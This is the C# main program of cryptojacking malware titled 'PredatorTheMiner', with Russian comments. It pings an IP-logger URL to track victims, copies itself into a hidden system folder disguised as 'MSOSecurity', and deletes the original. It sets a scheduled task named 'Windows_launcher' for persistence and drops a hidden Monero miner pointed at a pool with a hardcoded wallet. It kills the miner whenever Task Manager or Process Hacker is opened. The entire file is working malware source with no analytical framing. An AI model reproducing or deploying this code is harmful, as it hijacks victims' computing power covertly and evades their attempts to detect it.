using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace PredatorTheMiner
{
	class Program
	{
		public static string User()
		{
			return "48ChbTLzkwRB3zfrMxLM9FMkvgjp9g9aTQtUQog1ZS6rYZJ6J59nZBn6s6VegEjyxTT3FJtqEo83zSEPs9qDUUsbDdVMYXh";
		}

		public static string StartPath
		{
			get
			{
				return System.Windows.Forms.Application.ExecutablePath;
			}
		}

		public static string StartDir
		{
			get
			{
				return System.Windows.Forms.Application.StartupPath;
			}
		}

		static void Main()
		{
			try
			{
				Helper.SiteConnection("https://iplogger.com/1LVYB6"); // IPLogger

				string Pool = "pool.monero.hashvault.pro:443";
				string user = "user name";
				string cpu_usage = "75"; //25 50 75
				string password = "x";
				/* Данные для майнера */
				
				Process process = new Process();
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.Arguments = string.Format("--url={0} --user={1} --pass={4} --threads 5 --donate-level=1 " +
					"--keepalive --retries=5 --max-cpu-usage={3}",
					Pool, User(), "0x3", cpu_usage, password);
				process.StartInfo.FileName = StartDir + "\\runtime-servece.exe";
				/* Запуск майнера через cmd */
				user.Contains("");
				if (!StartDir.Contains(Environment.GetEnvironmentVariable("LocalAppData")))
				{
					try
					{
						string drop_folder = Environment.GetEnvironmentVariable("LocalAppData") + "\\MSOSecurity";
						if (Directory.Exists(drop_folder))
							Directory.Delete(drop_folder, true); // TODO: Replace this string with 'return' keyword
						Directory.CreateDirectory(drop_folder);
						File.Copy(StartPath, drop_folder + "\\Streamm.exe");
						File.SetAttributes(drop_folder + "\\Streamm.exe", FileAttributes.Hidden | FileAttributes.System);
						File.SetAttributes(drop_folder, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);
						Process.Start(drop_folder + "\\Streamm.exe");
						Helper.DeleteMe();
					}
					catch { }
				}
				else
				{
					RunTime.Defend.SetupDefend(RunTime.Defend.DefendOptions.AntiWindows7);

					new Implant.ScheduleTask("Windows_launcher").AddTask(StartPath);

					if (!File.Exists(StartDir + "\\runtime-servece.exe"))
						File.WriteAllBytes(StartDir + "\\runtime-servece.exe", Properties.Resources.shost);

					process.Start();
				}

				while (true)
				{
					if ((Process.GetProcessesByName("taskmgr").Length > 0 ||
						Process.GetProcessesByName("Taskmgr").Length > 0 ||
						Process.GetProcessesByName("ProcessHacker").Length > 0) || Environment.HasShutdownStarted)
					{
						process.Kill();
						Environment.Exit(0);
					}
					Thread.Sleep(10);
				}
			}
			catch { }
		}
	}
}
